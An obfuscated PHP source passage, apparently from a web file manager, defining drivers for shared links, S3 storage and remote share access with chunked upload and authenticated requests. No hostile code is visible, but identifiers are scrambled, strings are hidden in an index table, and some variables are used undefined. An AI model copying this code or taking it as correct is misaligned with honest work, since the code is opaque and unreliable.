($ÊÏŠË¬ø[$€¥ùµøÒ[33]] == KodIO::KOD_SHARE_ITEM) { return $ÊÏŠË¬ø[$€¥ùµøÒ[87]]; } $ŞÎÈÈÃ = KodIO::clear($úÙÁëé³); $áŒğ¯‘ = KodIO::clear($this->pathParse[$€¥ùµøÒ[572]][$€¥ùµøÒ[579]]); $íÑà¢˜ = substr($ŞÎÈÈÃ, strlen($áŒğ¯‘)); if (substr($ŞÎÈÈÃ, 0, strlen($áŒğ¯‘)) != $áŒğ¯‘) { return !1; } return $this->pathParse[$€¥ùµøÒ[1290]] . $€¥ùµøÒ[8] . ltrim($íÑà¢˜, $€¥ùµøÒ[8]); } public function getType() { $Â†’§ı¾ =& $_SERVER[¿ÈˆÑ¸ä]; $¤ñÚ©¹ = str_replace($Â†’§ı¾[77], $Â†’§ı¾[12], get_class($this)); return strtolower($¤ñÚ©¹); } public function isOsDriver($·©Ãˆ•î) { return IO::isOsDriver($·©Ãˆ•î); } public function info($şéÎ´—ä) { return $this->infoParse($şéÎ´—ä); } public function infoAuth($Ğ´¦êû) { return $this->infoParse($Ğ´¦êû); } public function infoWithChildren($‘‘¡ãÅá) { return $this->infoParse($‘‘¡ãÅá, !0); } public function infoFull($¹²Ü¯Œ€) { return $this->infoParse($¹²Ü¯Œ€); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ğå‚€Ğ) { $this->pathParse = $ğå‚€Ğ; } protected function infoParse($íÆîÂü¶, $ä¥Ñ¶Ì× = false) { $ŒØÇ­§¹ =& $_SERVER[¿ÈˆÑ¸ä]; return Action($ŒØÇ­§¹[1296])->sharePathInfo($this->pathParse[$ŒØÇ­§¹[87]], !0, $ä¥Ñ¶Ì×); } public function listPath($ı“´¡”ü, $ÇÈ«Àş = false) { $½æ·âºÏ =& $_SERVER[¿ÈˆÑ¸ä]; $Ì³ƒŸƒ = IO::listPath($ı“´¡”ü, $ÇÈ«Àş); if (!$Ì³ƒŸƒ) { return $Ì³ƒŸƒ; } if (is_array($Ì³ƒŸƒ[$½æ·âºÏ[1477]])) { $õ€©‹êè = Action($½æ·âºÏ[1486])->parsePathChildren($Ì³ƒŸƒ[$½æ·âºÏ[1477]], array($½æ·âºÏ[506] => $ı“´¡”ü)); $Ì³ƒŸƒ[$½æ·âºÏ[1477]] = Action($½æ·âºÏ[1296])->shareItemInfo($õ€©‹êè); } foreach ($Ì³ƒŸƒ as $»°âœËú => $©¼µüßÜ) { if (!in_array($»°âœËú, array($½æ·âºÏ[86], $½æ·âºÏ[85]))) { continue; } foreach ($©¼µüßÜ as $ÖæÏöº© => $õ€©‹êè) { $õ€©‹êè = Action($½æ·âºÏ[1486])->parsePathChildren($õ€©‹êè, array($½æ·âºÏ[506] => $ı“´¡”ü)); $Ì³ƒŸƒ[$»°âœËú][$ÖæÏöº©] = Action($½æ·âºÏ[1296])->shareItemInfo($õ€©‹êè); } } return $Ì³ƒŸƒ; } } goto D…‚ëê–º; FÑÙœ…†ÁÛ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ş†ªŸ³ò) { $Òƒâ•» =& $_SERVER[¿ÈˆÑ¸ä]; parent::__construct($ş†ªŸ³ò); $êªå¼Ù¤ = isset($ş†ªŸ³ò[$Òƒâ•»[257]]) && $ş†ªŸ³ò[$Òƒâ•»[257]] == $Òƒâ•»[248] ? $Òƒâ•»[248] : $Òƒâ•»[314]; $this->setSignVersion($êªå¼Ù¤); } public function link($Á¬äÅ©, $õµ¦Í¢ = array()) { return parent::link($Á¬äÅ©, $õµ¦Í¢); } public function fileOut($û³ªß, $Í´«¤ó¹ = false, $‹Šë»’ = false, $º³ß¯èˆ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¿ÈˆÑ¸ä][315])) { return parent::fileOutServer($û³ªß, $Í´«¤ó¹, $‹Šë»’, $º³ß¯èˆ); } parent::fileOut($û³ªß, $Í´«¤ó¹, $‹Šë»’, $º³ß¯èˆ); } public function fileOutImage($ˆ€‰Í«, $ïó´ºÂ = 250) { if (strstr($this->endpoint, $_SERVER[¿ÈˆÑ¸ä][315])) { return parent::fileOutImageServer($ˆ€‰Í«, $ïó´ºÂ); } parent::fileOutImage($ˆ€‰Í«, $ïó´ºÂ); } } define($_SERVER[¿ÈˆÑ¸ä][316], 1); define($_SERVER[¿ÈˆÑ¸ä][317], 2); goto bùì¥Òœ‘; D…‚ëê–º: class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($¦˜°šå¶) { $îñö‰Š² =& $_SERVER[¿ÈˆÑ¸ä]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $¦˜°šå¶; $Ç˜üìàø = Model($îñö‰Š²[683])->getInfo($¦˜°šå¶[$îñö‰Š²[483]]); $ºíÖÎ = _get($Ç˜üìàø, $îñö‰Š²[576]); $Œ»óšÍ§ = Model($îñö‰Š²[583])->authMake(_get($Ç˜üìàø, $îñö‰Š²[1487])); if (!$Ç˜üìàø) { IO::errorTips(LNG($îñö‰Š²[1488]), !1); } if (!$Œ»óšÍ§) { IO::errorTips(LNG($îñö‰Š²[1489]), !1); } if ($ºíÖÎ && is_string($ºíÖÎ)) { $ºíÖÎ = json_decode($ºíÖÎ, !0); } if (!$ºíÖÎ || !$Œ»óšÍ§) { return; } $this->_config = array($îñö‰Š²[1290] => rtrim($¦˜°šå¶[$îñö‰Š²[1290]], $îñö‰Š²[8]) . $îñö‰Š²[8], $îñö‰Š²[1490] => $îñö‰Š²[1397] . $ºíÖÎ[$îñö‰Š²[1491]] . $îñö‰Š²[495], $îñö‰Š²[572] => $Ç˜üìàø, $îñö‰Š²[576] => $ºíÖÎ, $îñö‰Š²[1492] => $Œ»óšÍ§, $îñö‰Š²[1493] => substr(APP_HOST, 0, 8) == $îñö‰Š²[218], $îñö‰Š²[1494] => Model($îñö‰Š²[587])->authCheck($Œ»óšÍ§[$îñö‰Š²[499]], AuthModel::AUTH_VIEW, !1), $îñö‰Š²[1495] => Model($îñö‰Š²[587])->authCheck($Œ»óšÍ§[$îñö‰Š²[499]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($ÒÙõßÚ) { $ÈãÎøÆæ =& $_SERVER[¿ÈˆÑ¸ä]; $ÊÙƒó = $this->_config; if (!$ÊÙƒó) { return !1; } $ËÁºÑîí = array($ÈãÎøÆæ[1496] => $ÊÙƒó[$ÈãÎøÆæ[1494]], $ÈãÎøÆæ[1497] => $ÊÙƒó[$ÈãÎøÆæ[1494]], $ÈãÎøÆæ[1318] => $ÊÙƒó[$ÈãÎøÆæ[1494]], $ÈãÎøÆæ[108] => $ÊÙƒó[$ÈãÎøÆæ[1495]], $ÈãÎøÆæ[1498] => $ÊÙƒó[$ÈãÎøÆæ[1495]], $ÈãÎøÆæ[1267] => $ÊÙƒó[$ÈãÎøÆæ[1495]], $ÈãÎøÆæ[1499] => !1, $ÈãÎøÆæ[430] => !1, $ÈãÎøÆæ[1500] => !1, $ÈãÎøÆæ[1501] => !1); return $ËÁºÑîí[$ÒÙõßÚ]; } public function listPath($µµ‚“², $Ó¦ÔŒÊ” = false) { return $this->request($_SERVER[¿ÈˆÑ¸ä][1502], array($µµ‚“²)); } public function setContent($†‘üí‹û, $æü‡ßŸå = '') { return $this->request($_SERVER[¿ÈˆÑ¸ä][1503], array($†‘üí‹û, $æü‡ßŸå)); } public function getContent($âî¼€ğ) { return $this->_fileSubstr($âî¼€ğ); } public function fileSubstr($ìø˜£äÕ, $ƒ¨¢ûôâ, $¬şÅÎƒ) { return $this->_fileSubstr($ìø˜£äÕ, $ƒ¨¢ûôâ, $¬şÅÎƒ); } public function download($Èå–ƒŒ°, $ÄêŸü¶Ì) { return $this->_download($Èå–ƒŒ°, $ÄêŸü¶Ì); } public function isFileOutServer() { return !1; } public function fileOut($¡šåˆŞ, $äŠğ¶… = false, $šÃ÷¬¿ù = false, $êÈœÁè± = '') { $¤Á¢ãÖ† =& $_SERVER[¿ÈˆÑ¸ä]; $this->fileOutLink($this->_fileLink($¡šåˆŞ, ($êÈœÁè± ? $¤Á¢ãÖ†[1504] . $êÈœÁè± : $¤Á¢ãÖ†[12]) . ($äŠğ¶… ? $¤Á¢ãÖ†[1505] : $¤Á¢ãÖ†[12]))); } public function fileOutImage($Ëªá³Ôõ, $¦İêË¶ = 250) { $this->fileOutLink($this->_fileLink($Ëªá³Ôõ, $_SERVER[¿ÈˆÑ¸ä][1506] . $¦İêË¶)); } public function fileOutLink($Ùø°ì™) { header($_SERVER[¿ÈˆÑ¸ä][173] . $this->urlAuto($Ùø°ì™)); die; } public function exist($Õ¢ªÀá) { $õè¾úöö = $this->_info($Õ¢ªÀá); return $õè¾úöö ? !0 : !1; } public function isFile($ë‡Ò¨Ÿ¬) { $…İ¸ªÌÂ =& $_SERVER[¿ÈˆÑ¸ä]; $Ù“ªĞÄˆ = $this->_info($ë‡Ò¨Ÿ¬); return _get($Ù“ªĞÄˆ, $…İ¸ªÌÂ[33], $…İ¸ªÌÂ[12]) == $…İ¸ªÌÂ[231]; } public function isFolder($€Æ™±á) { $ÃïÉï¶Ë =& $_SERVER[¿ÈˆÑ¸ä]; $•çÇ÷ËÖ = $this->_info($€Æ™±á); return _get($•çÇ÷ËÖ, $ÃïÉï¶Ë[33], $ÃïÉï¶Ë[12]) == $ÃïÉï¶Ë[78]; } public function size($”²†ã„) { $¹ˆ‘§¼ = $this->_info($”²†ã„); return _get($¹ˆ‘§¼, $_SERVER[¿ÈˆÑ¸ä][79], 0); } public function info($Òüğß½) { return $this->_info($Òüğß½); } public function infoAuth($çøÇ™øÌ) { return $this->_info($çøÇ™øÌ); } public function infoFull($€Ç¨ñ…Æ) { return $this->_info($€Ç¨ñ…Æ); } public function infoFullSimple($¸‹ë‚Çª) { return $this->_info($¸‹ë‚Çª); } public function infoWithChildren($âôµ˜Òè) { return $this->_info($âôµ˜Òè, !0); } public function has($ÕæğíÕ±, $Ğµ§¸áÌ = false, $áÖ“™÷ç = false) { $ò¤¶ë¬ =& $_SERVER[¿ÈˆÑ¸ä]; $ÏüñŸÌè = $this->_info($ÕæğíÕ±); if (!$ÏüñŸÌè) { return !1; } if ($Ğµ§¸áÌ) { return array($ò¤¶ë¬[240] => $ÏüñŸÌè[$ò¤¶ë¬[240]], $ò¤¶ë¬[241] => $ÏüñŸÌè[$ò¤¶ë¬[241]]); } return $ŸşùÄ‰ ? $ÏüñŸÌè[$ò¤¶ë¬[240]] > 0 : $ÏüñŸÌè[$ò¤¶ë¬[241]] > 0; } public function mkfile($ÍÉ­‡äë, $Ùş¥‰ö = '', $Õ‚ôæ¾« = REPEAT_RENAME) { return $this->request($_SERVER[¿ÈˆÑ¸ä][1479], array($ÍÉ­‡äë, $Ùş¥‰ö, $Õ‚ôæ¾«)); } public function mkdir($ù«éÅ×, $ãËóø¯ù = REPEAT_SKIP) { return $this->request($_SERVER[¿ÈˆÑ¸ä][1480], array($ù«éÅ×, $ãËóø¯ù)); } public function remove($¦Õê¡¯³) { return $this->request($_SERVER[¿ÈˆÑ¸ä][1267], array($¦Õê¡¯³)); } public function rename($ÉÒÕù¼, $Ï¬Üˆêç) { return $this->request($_SERVER[¿ÈˆÑ¸ä][1483], array($ÉÒÕù¼, $Ï¬Üˆêç)); } public function moveSameAllow() { } public function copy($´¯Ü¢˜, $ıÌ±Õñ‡, $œ‚˜…ÎÕ = REPEAT_REPLACE, $¬áûœ™ = false) { return $this->request($_SERVER[¿ÈˆÑ¸ä][637], array($´¯Ü¢˜, $ıÌ±Õñ‡, $œ‚˜…ÎÕ)); } public function move($£•Æ‹ˆˆ, $ıÌ®ßßç, $æËÅÆÊè = REPEAT_REPLACE, $¯’ú»Æ = false) { return $this->request($_SERVER[¿ÈˆÑ¸ä][639], array($£•Æ‹ˆˆ, $ıÌ®ßßç, $æËÅÆÊè)); } public function uploadLink($Şò°ëÍ©, $ÆÎø¶¶ = 0) { $á¨ £ =& $_SERVER[¿ÈˆÑ¸ä]; $şˆİÈˆë = IO::init($GLOBALS[$á¨ £[7]][$á¨ £[87]]); $ÑÅêÃïû = $this->pathApiEncode($şˆİÈˆë->path); $Ã¿÷ì = $this->requestMakeUrl($á¨ £[1507], array($á¨ £[87] => $ÑÅêÃïû)); return array($á¨ £[1508] => $Ã¿÷ì); } public function upload($ÍÚ· Åø, $¾¾½¹„ê, $ “ò³¥È = false, $æİïä·Ç = REPEAT_REPLACE) { $æÄÅå­™ =& $_SERVER[¿ÈˆÑ¸ä]; if (filesize($¾¾½¹„ê) < $this->uploadChunkSize) { return $this->request($æÄÅå­™[108], array($ÍÚ· Åø, $¾¾½¹„ê, $æİïä·Ç)); } $¿âõÀìé = $this->uploadHashCheck($ÍÚ· Åø, $¾¾½¹„ê, $æİïä·Ç); if ($¿âõÀìé) { return $¿âõÀìé; } $—ÅªšÉÄ = @filesize($¾¾½¹„ê); $º¢š‹é® = $this->uploadChunkSize; $îËĞÂ¡ú = ceil($—ÅªšÉÄ / $º¢š‹é®); $†ÛŒ‡Œ = 0; while ($†ÛŒ‡Œ < $îËĞÂ¡ú) { $¼Œ¹ïŸº = IO::fileSubstr($¾¾½¹„ê, $†ÛŒ‡Œ * $º¢š‹é®, $º¢š‹é®); $ñ¡Äëºû = $this->tempFile($æÄÅå­™[12], $¼Œ¹ïŸº); $–î‘§‰À = array($æÄÅå­™[79] => $—ÅªšÉÄ, $æÄÅå­™[1509] => $º¢š‹é®, $æÄÅå­™[1510] => $îËĞÂ¡ú, $æÄÅå­™[1511] => $†ÛŒ‡Œ); $¶â„°Çœ = $this->uploadSend($ÍÚ· Åø, $ñ¡Äëºû, $–î‘§‰À, $æİïä·Ç); $†ÛŒ‡Œ++; if (!$¶â„°Çœ) { return !1; } } if (!is_array($¶â„°Çœ) || empty($¶â„°Çœ[$æÄÅå­™[591]])) { return !1; } return $this->pathApiDecode($¶â„°Çœ[$æÄÅå­™[591]]); } private function uploadHashCheck($Ïû‹¡–Õ, $·õ•™Ææ, $ÖŠºë×) { $·Éñ¯Ë =& $_SERVER[¿ÈˆÑ¸ä]; $Ñ†Ù½ˆ = IO::hashSimple($·õ•™Ææ); $û¢ÅÇù¤ = array($·Éñ¯Ë[1512] => $·Éñ¯Ë[1513], $·Éñ¯Ë[1471] => $Ñ†Ù½ˆ); $’“¬ü»ˆ = $this->uploadSend($Ïû‹¡–Õ, $·Éñ¯Ë[12], $û¢ÅÇù¤, $ÖŠºë×); $»Ñ­’¾Ê = _get($’“¬ü»ˆ, $·Éñ¯Ë[591], array()); $¾Ó”–ï = _get($»Ñ­’¾Ê, $·Éñ¯Ë[1514]); if (!is_array($¾Ó”–ï) || !$¾Ó”–ï[$·Éñ¯Ë[559]]) { return !1; } $¸™ëĞÈû = IO::hashMd5($·õ•™Ææ); if ($¾Ó”–ï[$·Éñ¯Ë[559]] != $¸™ëĞÈû) { return !1; } if ($’“¬ü»ˆ[$·Éñ¯Ë[591]][$·Éñ¯Ë[1515]]) { $this->uploadChunkSize = $’“¬ü»ˆ[$·Éñ¯Ë[591]][$·Éñ¯Ë[1515]]; } $û¢ÅÇù¤ = array($·Éñ¯Ë[1512] => $·Éñ¯Ë[1516], $·Éñ¯Ë[1472] => $¸™ëĞÈû, $·Éñ¯Ë[1471] => $Ñ†Ù½ˆ); $’“¬ü»ˆ = $this->uploadSend($Ïû‹¡–Õ, $·Éñ¯Ë[12], $û¢ÅÇù¤, $ÖŠºë×); if (!is_array($’“¬ü»ˆ) || empty($’“¬ü»ˆ[$·Éñ¯Ë[591]])) { return !1; } return $this->pathApiDecode($’“¬ü»ˆ[$·Éñ¯Ë[591]]); } private function uploadSend($Š‹Ñ–åÑ, $†ĞŠ³Í©, $ğæœ–‹, $„×‡—¶Ÿ = '') { $ÆÍÎ¾À¯ =& $_SERVER[¿ÈˆÑ¸ä]; $ğæœ–‹[$ÆÍÎ¾À¯[32]] = get_path_this($Š‹Ñ–åÑ); $ğæœ–‹[$ÆÍÎ¾À¯[87]] = $this->pathApiEncode(get_path_father($Š‹Ñ–åÑ)); if ($„×‡—¶Ÿ) { $ğæœ–‹[$ÆÍÎ¾À¯[1517]] = $„×‡—¶Ÿ; } if ($†ĞŠ³Í©) { $ğæœ–‹[$ÆÍÎ¾À¯[231]] = $ÆÍÎ¾À¯[1332] . $†ĞŠ³Í©; } return $this->requestSend($ÆÍÎ¾À¯[1507], $ğæœ–‹); } protected function pathApiEncode($Ä¡¨Ò¨¿) { $ãÅù¯¢Ì =& $_SERVER[¿ÈˆÑ¸ä]; $µëË³¯Ö = $this->_config[$ãÅù¯¢Ì[1490]]; $èƒçÀ´İ = strlen($µëË³¯Ö); if (substr($Ä¡¨Ò¨¿, 0, $èƒçÀ´İ) == $µëË³¯Ö) { return $Ä¡¨Ò¨¿; } return $µëË³¯Ö . ltrim($Ä¡¨Ò¨¿, $ãÅù¯¢Ì[8]); } protected function pathApiDecode($ó¾âÏÈó) { $µ²ß›ºÜ =& $_SERVER[¿ÈˆÑ¸ä]; $Ú²«Å›œ = $this->_config[$µ²ß›ºÜ[1490]]; $ŒšÓ…Øû = strlen($Ú²«Å›œ); if (substr($ó¾âÏÈó, 0, $ŒšÓ…Øû) !== $Ú²«Å›œ) { return $ó¾âÏÈó; } return $this->_config[$µ²ß›ºÜ[1290]] . ltrim(substr($ó¾âÏÈó, $ŒšÓ…Øû), $µ²ß›ºÜ[8]); } private function pathInfoParse(&$¡¸ÄšĞ„) { $Ÿí”ò„ =& $_SERVER[¿ÈˆÑ¸ä]; $È†¼¾İ = $this->_config; $—ÑñÍ¤¯ = $È†¼¾İ[$Ÿí”ò„[572]]; if (!$¡¸ÄšĞ„ || !is_array($¡¸ÄšĞ„)) { return $¡¸ÄšĞ„; } static $ÓËäÎú· = array(); $¡ìşÒ‡Œ = $ÓËäÎú·[$—ÑñÍ¤¯[$Ÿí”ò„[684]]]; if (!is_array($¡ìşÒ‡Œ)) { $™ŠìÈ³ = LNG($Ÿí”ò„[1518]); $ÀÙ™ËûĞ = $È†¼¾İ[$Ÿí”ò„[576]][$Ÿí”ò„[90]]; $ä€ï‡ = parse_url($È†¼¾İ[$Ÿí”ò„[576]][$Ÿí”ò„[1519]]); $Üºº­ºÀ = $È†¼¾İ[$Ÿí”ò„[576]][$Ÿí”ò„[1520]]; $¡ìşÒ‡Œ = array($Ÿí”ò„[1521] => $ÀÙ™ËûĞ[$Ÿí”ò„[32]] . $Ÿí”ò„[1003] . $Üºº­ºÀ . $Ÿí”ò„[1332] . $ä€ï‡[$Ÿí”ò„[207]] . $Ÿí”ò„[1005], $Ÿí”ò„[1522] => $™ŠìÈ³ . $Ÿí”ò„[1069] . $È†¼¾İ[$Ÿí”ò„[576]][$Ÿí”ò„[1519]] . $Ÿí”ò„[1523] . LNG($Ÿí”ò„[1524]) . $Ÿí”ò„[1069] . $Üºº­ºÀ, $Ÿí”ò„[1525] => LNG($Ÿí”ò„[1526]) . $Ÿí”ò„[1527] . $È†¼¾İ[$Ÿí”ò„[576]][$Ÿí”ò„[1519]] . $Ÿí”ò„[286] . LNG($Ÿí”ò„[1528]) . $Ÿí”ò„[1527] . $ÀÙ™ËûĞ[$Ÿí”ò„[598]], $Ÿí”ò„[1520] => array($Ÿí”ò„[32] => $Üºº­ºÀ, $Ÿí”ò„[1529] => $Ÿí”ò„[1530]), $Ÿí”ò„[1531] => Action($Ÿí”ò„[1476])->shareTargetMake($—ÑñÍ¤¯[$Ÿí”ò„[1487]])); $ÓËäÎú·[$—ÑñÍ¤¯[$Ÿí”ò„[684]]] = $¡ìşÒ‡Œ; } unset($¡¸ÄšĞ„[$Ÿí”ò„[192]]); unset($¡¸ÄšĞ„[$Ÿí”ò„[600]]); unset($¡¸ÄšĞ„[$Ÿí”ò„[189]]); unset($¡¸ÄšĞ„[$Ÿí”ò„[585]]); $¡¸ÄšĞ„[$Ÿí”ò„[1532]] = !0; $¡¸ÄšĞ„[$Ÿí”ò„[233]] = $È†¼¾İ[$Ÿí”ò„[1494]]; $¡¸ÄšĞ„[$Ÿí”ò„[234]] = $È†¼¾İ[$Ÿí”ò„[1495]]; $¡¸ÄšĞ„[$Ÿí”ò„[498]] = $È†¼¾İ[$Ÿí”ò„[1492]]; $¡¸ÄšĞ„[$Ÿí”ò„[1520]] = $¡ìşÒ‡Œ[$Ÿí”ò„[1520]]; $¡¸ÄšĞ„[$Ÿí”ò„[1533]] = $—ÑñÍ¤¯[$Ÿí”ò„[232]]; $¡¸ÄšĞ„[$Ÿí”ò„[1534]] = $—ÑñÍ¤¯[$Ÿí”ò„[88]]; $¡¸ÄšĞ„[$Ÿí”ò„[1535]] = $¡ìşÒ‡Œ[$Ÿí”ò„[1525]]; $¡¸ÄšĞ„[$Ÿí”ò„[1531]] = $¡ìşÒ‡Œ[$Ÿí”ò„[1531]]; $ë‹©Ş• = explode($Ÿí”ò„[8], trim($¡¸ÄšĞ„[$Ÿí”ò„[598]], $Ÿí”ò„[8])); $ë‹©Ş•[0] = $¡ìşÒ‡Œ[$Ÿí”ò„[1521]]; $¡¸ÄšĞ„[$Ÿí”ò„[598]] = implode($Ÿí”ò„[8], $ë‹©Ş•); if (count($ë‹©Ş•) > 1) { unset($¡¸ÄšĞ„[$Ÿí”ò„[1531]]); } if (count($ë‹©Ş•) == 1) { if ($¡¸ÄšĞ„[$Ÿí”ò„[33]] == $Ÿí”ò„[78]) { $¡¸ÄšĞ„[$Ÿí”ò„[32]] = $¡ìşÒ‡Œ[$Ÿí”ò„[1521]]; } array_set_value($¡¸ÄšĞ„, $Ÿí”ò„[1536], $¡ìşÒ‡Œ[$Ÿí”ò„[1522]]); } $³î×€©í = array($Ÿí”ò„[1537], $Ÿí”ò„[1456], $Ÿí”ò„[1538], $Ÿí”ò„[1539]); foreach ($³î×€©í as $ìÜÛœ™) { $“èŠá—å = $this->urlAuto(_get($¡¸ÄšĞ„, $ìÜÛœ™, $Ÿí”ò„[12])); if ($“èŠá—å) { array_set_value($¡¸ÄšĞ„, $ìÜÛœ™, $“èŠá—å); } } } private function _info($Œ¼şûäî, $şÉÍŠúÑ = false) { $¶ÎŒ©• =& $_SERVER[¿ÈˆÑ¸ä]; $ÍÇê«Œî = $this->_config; if (!$ÍÇê«Œî) { return !1; } static $û¹ş©³Ó = array(); if (isset($û¹ş©³Ó[$Œ¼şûäî]) && is_array($û¹ş©³Ó[$Œ¼şûäî])) { return $û¹ş©³Ó[$Œ¼şûäî]; } if ((!$Œ¼şûäî || !trim($Œ¼şûäî, $¶ÎŒ©•[8])) && !$şÉÍŠúÑ) { $ÔŠŞ·‘Š = $ÍÇê«Œî[$¶ÎŒ©•[576]][$¶ÎŒ©•[90]]; if (!$ÔŠŞ·‘Š) { return !1; } $ÔŠŞ·‘Š[$¶ÎŒ©•[598]] = $¶ÎŒ©•[12]; $ÔŠŞ·‘Š[$¶ÎŒ©•[87]] = $ÍÇê«Œî[$¶ÎŒ©•[1290]]; $this->pathInfoParse($ÔŠŞ·‘Š); return $ÔŠŞ·‘Š; } $ŒÌäÔİÁ = $this->request($¶ÎŒ©•[1540], array($Œ¼şûäî, $şÉÍŠúÑ)); $û¹ş©³Ó[$Œ¼şûäî] = $ŒÌäÔİÁ; return $ŒÌäÔİÁ; } private function _fileSubstr($‰¥¼, $ÜÂ¾õ«• = 0, $¿âì•‡ö = -1) { $†æõ†¡ =& $_SERVER[¿ÈˆÑ¸ä]; $øÁ©¤Ùù = $this->_fileLink($‰¥¼); if (!$øÁ©¤Ùù) { return !1; } $ÕÃª‘º = !1; if ($¿âì•‡ö > 0) { $§¨Ù®¼ü = $‡ãÓãó + $¿âì•‡ö - 1; $ÕÃª‘º = array($†æõ†¡[1541] . $‡ãÓãó . $†æõ†¡[473] . $§¨Ù®¼ü); } $°¾Ä¡‰í = url_request($øÁ©¤Ùù, $†æõ†¡[1542], !1, $ÕÃª‘º); return $°¾Ä¡‰í[$†æõ†¡[833]] ? $°¾Ä¡‰í[$†æõ†¡[1326]] : !1; } private function _download($ôÇÙíû, $˜¡öÈà¡) { $ĞĞ¬îù = $this->_fileLink($ôÇÙíû); if (!$ĞĞ¬îù) { return !1; } Downloader::start($ĞĞ¬îù, $˜¡öÈà¡); return $˜¡öÈà¡; } private function _fileLink($Ä‚ª¿ôí, $­±ğŒ•Ò = '') { $êò‹¸¿ğ =& $_SERVER[¿ÈˆÑ¸ä]; $Ù¸Â½ªÖ = $this->pathApiEncode($Ä‚ª¿ôí); return $this->requestMakeUrl($êò‹¸¿ğ[1543], array($êò‹¸¿ğ[87] => $Ù¸Â½ªÖ)) . $­±ğŒ•Ò; } private function urlAuto($Ñ‡ó°åÎ) { $•úØòÚ— =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Ñ‡ó°åÎ) { return $Ñ‡ó°åÎ; } $ôĞ‘§éı = parse_url($Ñ‡ó°åÎ); $ñ–±–¿ƒ = $Ñ‡ó°åÎ; if ($this->_config[$•úØòÚ—[1493]] && $ôĞ‘§éı[$•úØòÚ—[206]] == $•úØòÚ—[150] && Input::check($ôĞ‘§éı[$•úØòÚ—[1544]], $•úØòÚ—[1545])) { $Ñ‡ó°åÎ = $•úØòÚ—[218] . substr($Ñ‡ó°åÎ, 7); } $îÌÍı¹ = $•úØòÚ—[1546] . rawurlencode(rtrim($this->config[$•úØòÚ—[1490]], $•úØòÚ—[8])); if (strstr($Ñ‡ó°åÎ, $îÌÍı¹)) { $ˆâËÒ Ø = strstr($Ñ‡ó°åÎ, $•úØòÚ—[76]) ? $•úØòÚ—[285] : $•úØòÚ—[76]; $Ñ‡ó°åÎ = $Ñ‡ó°åÎ . $ˆâËÒ Ø . $•úØòÚ—[1547] . $this->authToken; } return $Ñ‡ó°åÎ; } private function request($¸¸½Ïš, $Œ»ôÍÂû) { $À°•ş» =& $_SERVER[¿ÈˆÑ¸ä]; if (!is_array($Œ»ôÍÂû)) { $Œ»ôÍÂû = array(); } for ($ËÇ¼Ú­Ù = 0; $ËÇ¼Ú­Ù < 4; $ËÇ¼Ú­Ù++) { if (!isset($Œ»ôÍÂû[$ËÇ¼Ú­Ù])) { $Œ»ôÍÂû[$ËÇ¼Ú­Ù] = $À°•ş»[12]; } } $ôœ÷™¿õ = array($À°•ş»[1540] => array($À°•ş»[1548] => $À°•ş»[1540], $À°•ş»[1549] => $À°•ş»[1550], $À°•ş»[1551] => $À°•ş»[87], $À°•ş»[1289] => array($À°•ş»[1552] => array(array($À°•ş»[87] => $Œ»ôÍÂû[0])), $À°•ş»[1553] => $Œ»ôÍÂû[1] ? $À°•ş»[91] : $À°•ş»[12])), $À°•ş»[1502] => array($À°•ş»[1548] => $À°•ş»[1554], $À°•ş»[1549] => $À°•ş»[87], $À°•ş»[1551] => $À°•ş»[1555], $À°•ş»[1289] => array($À°•ş»[87] => $Œ»ôÍÂû[0])), $À°•ş»[1556] => array($À°•ş»[1548] => $À°•ş»[1557], $À°•ş»[1549] => $À°•ş»[87], $À°•ş»[1551] => $À°•ş»[1558], $À°•ş»[1289] => array($À°•ş»[87] => $Œ»ôÍÂû[0])), $À°•ş»[1503] => array($À°•ş»[1548] => $À°•ş»[1559], $À°•ş»[1549] => $À°•ş»[87], $À°•ş»[1560] => $À°•ş»[1561], $À°•ş»[1289] => array($À°•ş»[87] => $Œ»ôÍÂû[0], $À°•ş»[169] => $Œ»ôÍÂû[1])), $À°•ş»[1479] => array($À°•ş»[1548] => $À°•ş»[1479], $À°•ş»[1549] => $À°•ş»[87], $À°•ş»[1560] => $À°•ş»[591], $À°•ş»[1289] => array($À°•ş»[87] => $Œ»ôÍÂû[0], $À°•ş»[169] => $Œ»ôÍÂû[1], $À°•ş»[1517] => $Œ»ôÍÂû[2])), $À°•ş»[1480] => array($À°•ş»[1548] => $À°•ş»[1480], $À°•ş»[1549] => $À°•ş»[87], $À°•ş»[1560] => $À°•ş»[591], $À°•ş»[1289] => array($À°•ş»[87] => $Œ»ôÍÂû[0], $À°•ş»[1517] => $Œ»ôÍÂû[2])), $À°•ş»[637] => array($À°•ş»[1548] => $À°•ş»[1562], $À°•ş»[1549] => $À°•ş»[1563], $À°•ş»[1560] => $À°•ş»[1564], $À°•ş»[1289] => array($À°•ş»[1552] => array(array($À°•ş»[87] => $Œ»ôÍÂû[0])), $À°•ş»[87] => $Œ»ôÍÂû[1], $À°•ş»[1517] => $Œ»ôÍÂû[2])), $À°•ş»[639] => array($À°•ş»[1548] => $À°•ş»[1565], $À°•ş»[1549] => $À°•ş»[1563], $À°•ş»[1560] => $À°•ş»[1564], $À°•ş»[1289] => array($À°•ş»[1552] => array(array($À°•ş»[87] => $Œ»ôÍÂû[0])), $À°•ş»[87] => $Œ»ôÍÂû[1], $À°•ş»[1517] => $Œ»ôÍÂû[2])), $À°•ş»[1267] => array($À°•ş»[1548] => $À°•ş»[1566], $À°•ş»[1549] => $À°•ş»[1550], $À°•ş»[1551] => $À°•ş»[87], $À°•ş»[1289] => array($À°•ş»[1552] => array(array($À°•ş»[87] => $Œ»ôÍÂû[0])))), $À°•ş»[1483] => array($À°•ş»[1548] => $À°•ş»[1567], $À°•ş»[1549] => $À°•ş»[87], $À°•ş»[1560] => $À°•ş»[591], $À°•ş»[1289] => array($À°•ş»[87] => $Œ»ôÍÂû[0], $À°•ş»[1568] => $Œ»ôÍÂû[1])), $À°•ş»[108] => array($À°•ş»[1548] => $À°•ş»[1507], $À°•ş»[1549] => $À°•ş»[87], $À°•ş»[1560] => $À°•ş»[591], $À°•ş»[1289] => array($À°•ş»[87] => get_path_father($Œ»ôÍÂû[0]), $À°•ş»[231] => $Œ»ôÍÂû[1] ? $À°•ş»[1332] . $Œ»ôÍÂû[1] : 